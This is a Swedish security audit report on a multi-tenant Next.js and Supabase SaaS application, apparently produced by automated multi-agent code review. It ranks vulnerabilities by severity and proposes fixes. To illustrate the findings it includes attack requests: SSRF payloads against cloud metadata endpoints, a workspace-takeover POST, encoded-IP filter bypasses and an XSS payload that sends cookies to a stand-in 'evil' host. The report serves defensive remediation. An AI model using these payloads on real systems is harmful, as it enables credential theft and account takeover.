# Säkerhets- och kritikalitetsrapport — AEO Pulse Advance

**Datum:** 2026-05-18
**Analyserad branch:** `fase-0/T02-T06-residual-cleanup`
**Omfattning:** hela projektet (333 TS/TSX-filer, ~100 API-route) — Next.js 16 App Router, Supabase Auth, Prisma, Stripe, flera AI-providers.
**Metod:** statisk kodgranskning + 4 parallella specialiserade audits (auth/authz, injection/SSRF, secrets/crypto/beroenden, dataisolering/kvalitet). De 3 "headline"-fynden verifierades personligen genom läsning av källkoden.

---

## ⚠️ Verkställande utlåtande

**Det nuvarande tillståndet är INTE lämpligt för produktionsdeploy.** Det finns minst **4 kritiska sårbarheter som idag kan utnyttjas av en anonym användare på internet**, utan någon autentisering:

1. Massvis cross-tenant-läsning av kunddata (flera endpoints).
2. Takeover av workspace/organisation (vem som helst befordrar sig själv till `owner`).
3. Kundernas AI-providers API-nycklar **är inte krypterade** (den dokumenterade krypteringen finns inte i koden).
4. Oautentiserad SSRF som når molnets metadata-endpoints (stöld av infrastrukturcredentials).

Grundorsaken är arkitektonisk: middleware **tillämpar inte** autentisering på `/api/*`-routerna (endast rate-limit + CSP) och **det finns ingen Row-Level Security** på databasen — den multi-tenant-isolering beror helt på att varje handler kommer ihåg att filtrera per användare. Dussintals nya routes (Fas 1, filer `A` i `git status`) har hoppat över denna kontroll. Det finns inget djupförsvar.

| Allvarlighetsgrad | Antal |
|---|---|
| 🔴 Kritisk | 4 |
| 🟠 Hög | 11 |
| 🟡 Medel | 12 |
| 🔵 Låg | 7 |

---

## 🔴 KRITISKA (utnyttjbara av anonym, åtgärdas före varje deploy)

### C-1 — Cross-tenant dataexponering utan autentisering (massläckage) ✅ *verifierad*
**Fil:** `src/app/api/health-scores/route.ts:15-44`, `src/app/api/gsc/route.ts:6-51`, `src/app/api/scraper/route.ts:6-45`, `src/app/api/keywords/route.ts:6-45`

Ingen av dessa GET anropar `getCurrentUserId`. De använder **service-role**-klienten (som kringgår RLS) och filtrerar endast på ett `brand_id` som tillhandahålls av angriparen — **valfritt**. Utan `brand_id` returnerar de de senaste raderna **från alla tenants**:

```
GET /api/health-scores          → metriche AVI/visibilità/sentiment di tutti i clienti
GET /api/gsc?brand_id=<vittima> → click/impression Google Search Console di un tenant
GET /api/keywords               → keyword research di tutti i tenant
```

**Påverkan:** vem som helst, utan inloggning, läser affärsdata för vilken kund som helst. IDOR + oautentiserad dump.
**Fix:** högst upp i varje handler: `getCurrentUserId()` → lös de åtkomliga brands med `getAccessibleBrandIds()` → kräv `brand_id` och validera det med `verifyBrandAccess(brandId, userId)`. Returnera aldrig ofiltrerade result sets. Använd `/api/snapshots` som korrekt referensimplementation.

### C-2 — Takeover av Workspace/Organisation: RBAC bypass + IDOR ✅ *verifierad*
**Fil:** `src/app/api/workspaces/[id]/members/route.ts:16-158` (GET/POST/PATCH/DELETE), `src/app/api/workspaces/route.ts:8-89`, `src/app/api/organizations/current/route.ts:6-54`

Ingen handler autentiserar anroparen. POST tar `userId`, `role`, `inviterId` **från body** och anropar `addWorkspaceMember` utan någon behörighetskontroll (`canManageMembers` finns i `src/lib/services/workspace-auth.ts:174` men anropas aldrig). `GET /api/workspaces?userId=<vittima>` och `GET /api/organizations/current?userId=<vittima>` tar identiteten **från query string**.

```
POST /api/workspaces/<qualsiasi-id>/members
{ "userId": "<id-attaccante>", "role": "owner" }      → attaccante diventa owner
GET  /api/organizations/current?userId=<vittima>      → enumera org e membri altrui
```

**Påverkan:** fullständig cross-tenant-takeover, privilege escalation, borttagning av den legitima ägaren, förgiftning av audit-loggen (`actorId` styrt av angriparen).
**Fix:** härled aktören ALLTID från sessionen (`getCurrentUserId`), aldrig från body/query; tillämpa `checkPermission(userId, workspaceId, 'manage_members')` / `checkOrgPermission` före varje mutation och varje listning; förhindra borttagning/degradering av den sista ägaren.

### C-3 — AI-providers API-nycklar lagrade utan verklig kryptering ✅ *verifierad*
**Fil:** `src/app/api/keys/route.ts:6-23,126,141`; `src/app/dashboard/settings/page.tsx:83,118,243`; `.env.example:96-98`

`ENCRYPTION_KEY` är dokumenterad ("Encryption key for user-stored API keys") men **refereras ingenstans i `src/`** — ingen `createCipheriv`/AES-GCM/`crypto.subtle`. Kolumnen `user_api_keys.encrypted_key` innehåller:
- en **oåterkallelig SHA-256-hash** (`hashApiKey`, rad 21-23) — nyckeln går då inte ens att använda för att anropa providern; eller
- **nyckeln i klartext** (heuristiken `isPlaintextKey` misslyckas ofta).

Dessutom gör `src/app/dashboard/settings/page.tsx:83` `select('*')` via anon-klient och rad 243 visar hemligheten i UI med en "öga"-toggle → hemligheten färdas hela vägen till browsern.
**Påverkan:** vilken läsning av DB som helst (SQL injection, stulen backup, komprometterad service-key, felkonfigurerad RLS, insider) exponerar i klartext OpenAI/Anthropic/Gemini/Perplexity-nycklarna för alla kunder → direkt finansiellt missbruk på kundernas konton.
**Fix:** verklig autentiserad kryptering — `aes-256-gcm` med slumpmässig 12-byte IV per record, spara `iv||authTag||ciphertext`, nyckel från `ENCRYPTION_KEY` (validera 32-byte längd), dekryptera endast server-side. Migrera de befintliga raderna. Returnera aldrig nyckelmaterialet till klienten (exponera endast provider/label/last-4). Eliminera SHA-256-pathen.

### C-4 — Oautentiserad SSRF mot molnets metadata / interna nätet
**Fil:** `src/app/api/audit/route.ts:9-16`, `src/app/api/audit/{freshness,llms-txt,fix-brief}/route.ts`, `src/app/api/analyze/route.ts:69-141`, `src/app/api/ai-agent/route.ts:51-99`, `src/app/api/serp/schema-validate/route.ts:16`, `src/app/api/seo/knowledge-graph/route.ts:53`; sink i `src/lib/audit/site-audit.ts:9,63`, `src/lib/audit/generators.ts:49,146`, `src/lib/services/analysis.ts:97`, `src/lib/services/technical-seo-audit.ts:37`

Det finns en härdad `safeFetch` (`src/lib/utils/safe-fetch.ts`) men huvud-pathsen för audit/scrape använder **rå `fetch()`** med URL från användaren, utan auth eller IP-validering. `/api/audit` har varken auth eller rate-limit; `/api/ai-agent` löser användaren endast för kostnadsloggningen och fortsätter som `'anonymous'`.

```
POST /api/audit  {"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
POST /api/audit  {"url":"http://metadata.google.internal/computeMetadata/v1/"}
```

**Påverkan:** stöld av molnets IAM-credentials, kartläggning/port-scan av interna nätet, läsning av interna tjänster — det hämtade innehållet returneras i responsen. Uppgiften `task-28-ssrf-restore` är i praktiken inte implementerad på pathsen med högst trafik.
**Fix:** dirigera **varje** fetch av användar-URL genom `safeFetch`; lägg till auth + rate-limit på `/api/audit*` och `/api/ai-agent`; blockera privata/link-local-intervall; validera URL:en med zod (`.url()`).

---

## 🟠 HÖGA

### H-1 — `safeFetch` går att kringgå
**Fil:** `src/lib/utils/safe-fetch.ts`, `src/lib/domain-analysis.ts:37-66`
Ingen normalisering av literala IP:er: `http://2130706433/` (decimal), `0x7f000001`, `0177.0.0.1`, `127.1`, `0.0.0.0` finns inte i blocklistan. **DNS rebinding/TOCTOU**: hosten löses upp för valideringen och löses upp igen oberoende vid `fetch` (rad 140) — ingen IP pinning. Efter redirect-loopen finns ett slutligt `fetch(currentUrl)` **som inte valideras**. `domain-analysis.isSafeUrl` är en andra, svagare och duplicerad guard.
**Fix:** parsa/avvisa literala IP:er i varje bas (använd `node:net`/`ipaddr.js`); pinna den validerade IP:n på anslutningen; revalidera host+IP vid varje hop inklusive post-loop; konsolidera till en enda `safeFetch`.

### H-2 — Stored XSS i HTML-rapporten
**Fil:** `src/app/api/reports/html/route.ts:160-163,192-194,220,261,293`
`generateHtmlReport` interpolerar `brandName`, `brand.domain`, konkurrenters namn (från tabellen `brands`, sättbara av användaren) i rå HTML utan escaping. En konkurrent som heter `<script>fetch('//evil/?c='+document.cookie)</script>` reflekteras i ett same-origin `text/html`-svar och renderas inline (`GET /api/reports/html?brandId=...&download=0`).
**Påverkan:** persistent XSS i den autentiserade sessionen; med brands delade i teamet blir det "wormable" i organisationen.
**Fix:** entity-encoding (`& < > " '`) av varje dynamiskt värde; eller framtvinga `Content-Disposition: attachment` + icke-HTML content-type. Utvidga kontrollen till alla HTML/PDF-generatorer.

### H-3 — Stripe-webhook: icke constant-time-jämförelse + inget replay-skydd
**Fil:** `src/app/api/billing/webhook/route.ts:9-25,42-45`
HMAC beräknas korrekt men jämförs med `===` (timing side-channel); `t=`-`timestamp` extraheras men **valideras aldrig** → ett fångat event kan **spelas om i oändlighet** (t.ex. `checkout.session.completed` → upprepad kreditering av credits). `user_id`/`plan`/`credits` tas från `session.metadata` och betraktas som betrodda. `stripe.webhooks.constructEvent` används inte.
**Fix:** använd `stripe.webhooks.constructEvent`, eller `crypto.timingSafeEqual` + tolerans `|now - t| ≤ 300s`.

### H-4 — Race i kreditavdraget → double-spend / obegränsade gratisfrågor
**Fil:** `src/app/api/credits/use/route.ts:86-179`
Check-then-act är inte atomiskt vare sig på free-tier (räknar dagens rader och beslutar sedan) eller på betalsaldot (summerar `balance`, infogar sedan en separat negativ rad). Samtidiga requests läser samma saldo och passerar båda → negativt saldo / utgift utöver det köpta. Per-IP rate-limit (10/min) förhindrar inte 10 samtidiga requests inom samma sekund.
**Påverkan:** direkt intäktsförlust + amplifiering av LLM-kostnader.
**Fix:** check+avdrag i **en enda atomisk operation** (`UPDATE ... WHERE balance >= cost RETURNING`, Postgres-funktion, eller serializable transaktion med row lock). Samma mönster för den dagliga free-räknaren (`INSERT ... ON CONFLICT`).

### H-5 — Ingen Row-Level Security på tenant-tabellerna
**Fil:** `prisma/migrations/*` (RLS aktiverad endast på `audit_logs` i `20260513120000_..._apikeys/migration.sql:304-322`), `src/lib/supabase.ts:47-60`
`brands`, `prompts`, `monitoring_results`, `scans`, `snapshots`, `keyword_*`, `organizations`, `workspaces`, `*_members`, `user_api_keys`, `credits` har ingen isolering på DB-nivå. Varje route använder **service-role**-klienten. Isoleringen beror till 100% på applikationskoden — en invariant som redan är bruten (se C-1/C-2).
**Fix:** kort sikt — en enda helper `requireUser()` + brand-scoping tillämpad enhetligt, med ett test/lint som failar varje `route.ts` som använder `createServerClient` utan auth. Lång sikt — RLS + per-tenant-policy och reads via authenticated klient.

### H-6 — Audit-logg exporterbar utan RBAC
**Fil:** `src/app/api/audit-logs/route.ts:26-45`, `src/app/api/audit-logs/export/route.ts:26-40`
Autentiserade och korrekt scopade till org, men kontrollen av behörigheten `view_audit_logs` saknas (endast `owner`/`admin` enligt `ORG_PERMISSION_MATRIX`). En enkel `member` kan exportera upp till 10 000 rader audit (IP, user-agent, alla användares åtgärder).
**Fix:** `if (!await checkOrgPermission(userId, org.id, 'view_audit_logs')) return 403` på båda.

### H-7 — Bypass av kreditkontrollen i `/api/monitoring`
**Fil:** `src/app/api/monitoring/route.ts:143-180`
Kreditgrinden ligger i `try/catch` med kommentaren "Continue anyway" och **ingen dev-only-guard** → i produktion gör vilket fel som helst i kontrollen att den multi-engine LLM-körningen fortsätter utan att dra credits (kan framtvingas genom att inducera fel i den interna fetchen).
**Fix:** fail-closed (402/503) i produktion; bypass endast med explicit dev-flagga.

### H-8 — Invitations-endpoint: replay + felaktig identitetsbindning
**Fil:** `src/app/api/invitations/accept/route.ts:12-14,57-104`
`acceptSchema` är endast `z.string()` (inget format/längd). Medlemskapet infogas med `email: invitation.email` men `user_id: <chiamante autenticato>` **utan att verifiera att anroparens e-post matchar** den i inbjudan; `invitation.status` kontrolleras inte på nytt → token kan spelas om till utgång. Token returneras dessutom i body av POST `/api/team` (`route.ts:190,249`).
**Påverkan:** den som får tag på/gissar en giltig token binder sitt konto till ett brand som inte är dess eget (privilege escalation).
**Fix:** `z.string().regex(/^[a-f0-9]{64}$/)`; verifiera autentiserad e-post == `invitation.email`; transaktion som invaliderar token (`UPDATE ... WHERE status='pending'`) före insert; returnera inte token i svaret.

### H-9 — Cron-token jämförd på icke constant-time-sätt
**Fil:** `src/app/api/cron/{monitoring,weekly-review,keyword-refresh,gsc-sync,digest,brightdata-sync,aeo-bridge}/route.ts`
`if (authHeader !== \`Bearer ${cronSecret}\`)` — timing side-channel på den privilegierade hemligheten (hemligheten *är* obligatorisk: bra, fail-closed om den saknas).
**Fix:** `crypto.timingSafeEqual` på buffertar med fast längd (hash av båda sidorna).

### H-10 — Dyra LLM-endpoints utan rate-limit (cost-runaway)
**Fil:** `src/app/api/ai-agent/route.ts:25-185` (anonym + LLM + crawl, ingen throttle), `src/app/api/recommendations/route.ts:54-181` (auth ok men ingen `checkRateLimit` före `callGemini`), `src/app/api/journey/analyze/route.ts:20-58` (ingen auth, `turns[]` obegränsat, `runtime='edge'`)
**Påverkan:** en klient kan hamra appens dyraste endpoints — fenande av LLM-kostnader, osynligt missbruk (`ai_cost_logs` hoppas över för anonymous).
**Fix:** obligatorisk auth + `checkRateLimit` keyad på `userId`; tak på `turns.length` och antal audit-URL:er.

### H-11 — Sårbara runtime-beroenden (`npm audit`: 0 critical, 4 high)
- **`next` ^16.1.6** — *High, direkt, runtime*. Bland advisories: **GHSA-ffhc-5mcf-pf4q "XSS i App Router med nonce CSP"** (denna app använder per-request nonce CSP i `src/middleware.ts` → direkt relevant), middleware/proxy-bypass (GHSA-26hh-7cqf-hhc6, GHSA-492v-c6pp-mqqv, GHSA-267c-6grr-h53f), cache poisoning, DoS image-optimization.
- **`tar` <=7.5.10** — *High, transitiv via CLI `supabase`*. Path traversal / symlink write.
- **`fast-uri` <=3.1.1** — *High, transitiv*. Path traversal / host confusion.
- **`supabase` ^1.226.0** — det är CLI:n: bör ligga i `devDependencies`.
**Fix:** `npm audit fix`; uppdatera `next` till senaste patch 16.x; flytta `supabase` till devDependencies; tvinga `tar`/`fast-uri` till patchade versioner.

---

## 🟡 MEDEL

- **M-1 — Råa DB-felmeddelanden returnerade till klienten.** Utbrett mönster: `return err(error.message)` / `err(fetchError.message)` i `snapshots`, `recommendations`, `scans`, `competitor`, `monitoring`, `team`, `serp/tracker`. Exponerar kolumn-/constraint-/relationsnamn. *Fix:* generiskt meddelande + stabil kod, logga detaljer server-side.
- **M-2 — `getClientIp` går att spoofa** (`src/lib/ratelimit.ts:164-171`): litar på första `x-forwarded-for`/`x-real-ip` utan betrodd proxy → rate-limit kan kringgås genom att rotera headern. *Fix:* på Vercel använd plattforms-IP (högra hoppet); för autentiserade routes keya på `userId`.
- **M-3 — Inget tak på storleken av hämtade svar** (`site-audit.ts`, `generators.ts`, `analysis.ts`, `technical-seo-audit.ts`): `await response.text()` på multi-GB-stream → minnesuttömning. *Fix:* byte-tak (5–10 MB) + timeout.
- **M-4 — ReDoS / obegränsad input:** `crawlability.ts:65` `new RegExp(\`^${normalizedRule}\`)` från `User-agent` i angriparens robots.txt; `generators.ts:158-162` med `maxUrls` obegränsad (`maxUrls || 200` accepterar vilket tal som helst). *Fix:* tak `maxUrls ≤ 500`, escaping av alla metatecken eller icke-regex-parser.
- **M-5 — Inkonsekvent auktoriseringsmodell:** vissa routes använder `brand.user_id === userId` istället för `verifyBrandAccess` (`archive/query/[id]`, `analytics/historical`, `serp/tracker`) och **ingen dataroute beaktar `organization_id`/`workspace_id`** → team-medlemmar nekas på vissa routes, och org-sharing tillämpas inte på datan (latent Fas-1-lucka). *Fix:* en enda `verifyBrandAccess` som även utvärderar org/workspace.
- **M-6 — `/api/errors` kan förgiftas:** `userId`/`brandId`/`stack` tas från icke-autentiserad body och skrivs till `security_logs` + Sentry. *Fix:* lita inte på body, size-limit, markera som untrusted.
- **M-7 — Hårdkodad webhook-hemlighet i non-prod** (`src/lib/services/webhook-delivery.ts:11-19`): `'dev-only-webhook-secret-do-not-use-in-production'` används för att signera i vilken `NODE_ENV != production` som helst (preview/staging). *Fix:* throw alltid om den saknas.
- **M-8 — v1 API-nycklar verifierade med osaltad SHA-256** på samma kolumn `encrypted_key` (`src/app/api/v1/.../route.ts`): offline bruteforce + överlastning av kolumnen. *Fix:* dedikerad tabell `api_keys` med bcrypt/argon2 eller HMAC med pepper.
- **M-9 — Inputvalidering saknas** på `/api/audit*`, `/api/ai-agent`, `serp/schema-validate`, `seo/knowledge-graph` (body/objekten `providedAudit`/`context` betrodda råa, ingen storleksgräns). *Fix:* zod-scheman URL-validerade och längdbegränsade.
- **M-10 — `.or()` med stränginterpolation** (`src/app/api/scans/route.ts:44`): PostgREST injection-prone-mönster (idag inte utnyttjbart eftersom UUID:erna är betrodda). *Fix:* använd `.in()`/`.eq()`-builder eller validera UUID.
- **M-11 — Hardening CSP/CORS:** `style-src 'unsafe-inline'` och `img-src https:` (`src/middleware.ts:32-43`); statisk CORS tillämpad även på webhook/cron utan `Vary: Origin` (`vercel.json:37-54`). *Fix:* style-src nonce/hash, img-src begränsad, CORS scopad per route.
- **M-12 — Inkonsekvent svarsenvelope:** de flesta använder `{success,message}` (`api-utils`), men `serp/tracker`/`journey/analyze`/`audit-logs`/`workspaces`/`cost-monitor` använder `{error}`. *Fix:* standardisera på `api-utils`-envelopen.

---

## 🔵 LÅGA

- **L-1 — Fallback `DEV_USER_ID` inte gated av `isProductionRuntime`** (`src/lib/supabase.ts:150-156`): CF-01-guarden på modulnivå skyddar Vercel-prod, men den slutliga fallbacken är ett enskiktsförsvar (risk på self-host/Docker/preview med `DEV_USER_ID` satt). *Fix:* explicit gate `!isProductionRuntime` även på denna branch.
- **L-2 — Demo-credentials i klientbundlen** med hårdkodad fallback `Demo1234!` (`src/app/auth/login/page.tsx:23-25`). *Fix:* inget känt lösenord i bundlen; verifiera att inget demo-prod-konto använder det.
- **L-3 — Sentry-klient utan PII-scrubbing** (`sentry.client.config.ts:32-37`): servern scrubbar, klienten inte. *Fix:* replikera redaktionen server-side.
- **L-4 — Döda auth-guards:** `if (!userId)` efter `getCurrentUserId` (som *kastar*, inte returnerar falsy) i `reviews/weekly`, `cost-monitor` → ofångad `AuthError` blir 500 istället för 401. *Fix:* `try/catch (AuthError)` som i de andra routerna.
- **L-5 — `console.error` i ~12 catch i API-routes** (`ai-agent`, `cost-monitor`, `gsc`, `audit*`, `health-scores`, `keywords`, `scraper`): `compiler.removeConsole` i prod eliminerar dem → **tysta** felpaths (ingen Sentry/log). *Fix:* använd `logger.error`.
- **L-6 — Densitet av `: any` / `as any`: 148 förekomster i 43 filer**, koncentrerade just till DB-koden med isoleringsbuggarna. *Fix:* typa Supabase-svaren inkrementellt (typerna `Database` är redan genererade).
- **L-7 — Beroendet `tweetnacl` deklarerat men aldrig använt** i `src/`. *Fix:* ta bort för att minska supply-chain-ytan.

---

## ✅ Positiva aspekter (redan korrigerade / välgjorda)

- `npx tsc --noEmit` → **0 errors** (uppgiften `task-27-tsc-cleanup` är redan stängd); `next.config.ts` har **inte** `ignoreBuildErrors`/`ignoreDuringBuilds`.
- Starka säkerhets-headers: HSTS, `X-Frame-Options: DENY`, `nosniff`, `Referrer-Policy`, `Permissions-Policy`, CSP med per-request nonce.
- Invite/team-tokens genererade med `crypto.randomBytes(32)` (inte `Math.random`).
- **Utgående** webhook: korrekt HMAC-SHA256; `verifyWebhook` inkommande (`src/lib/services/public-api.ts:7-13`) använder korrekt `timingSafeEqual` med längd-precheck.
- `.env`/`.env.local` korrekt git-ignored; ingen verklig hemlighet committad (endast placeholder i `.env.example`).
- Ingen SQL injection (`$queryRaw*` saknas), ingen `child_process`/path-traversal, ingen zip-slip i exporterna.
- `/api/snapshots` är en korrekt referensimplementation (`getCurrentUserId` → `verifyBrandAccess`) att replikera överallt.

---

## 🛠️ Rekommenderad remediation-prioritet

**Sprint 0 — deploy-blockerande (dagar):**
1. C-1, C-2: lägg till `getCurrentUserId` + scoping/RBAC på alla nya Fas-1-routes (delad helper `requireUser()` + `verifyBrandAccess`). Lägg till en test/lint-grind som failar varje `route.ts` med `createServerClient` utan auth.
2. C-4 + H-1: dirigera varje användar-fetch genom härdad `safeFetch` (literala IP:er, IP pinning, post-loop redirect); auth+rate-limit på `/api/audit*` och `/api/ai-agent`.
3. C-3: verklig AES-256-GCM-kryptering för `user_api_keys` + migrering + sluta skicka secrets till klienten.

**Sprint 1 — hög prioritet (1–2 veckor):**
4. H-3 (Stripe `constructEvent`), H-4 (atomiskt kreditavdrag), H-8 (invitation), H-9 (cron timingSafeEqual), H-7 (monitoring fail-closed), H-2 (escaping HTML-rapport).
5. H-11: uppdatera `next` + `npm audit fix` + flytta `supabase` till devDeps.

**Sprint 2 — djupförsvar (3–4 veckor):**
6. H-5: aktivera RLS på tenant-tabellerna; flytta användar-reads till authenticated klient.
7. Medel (M-1…M-12) och Låga, standardisering av envelope/errors, hardening av rate-limit.

---

*Rapport genererad av statisk multi-agent-analys. Fynden C-1/C-2/C-3 verifierades manuellt mot källkoden; de övriga kommer från specialiserade audits med fil:rad-citat och ska omverifieras under fix-fasen.*
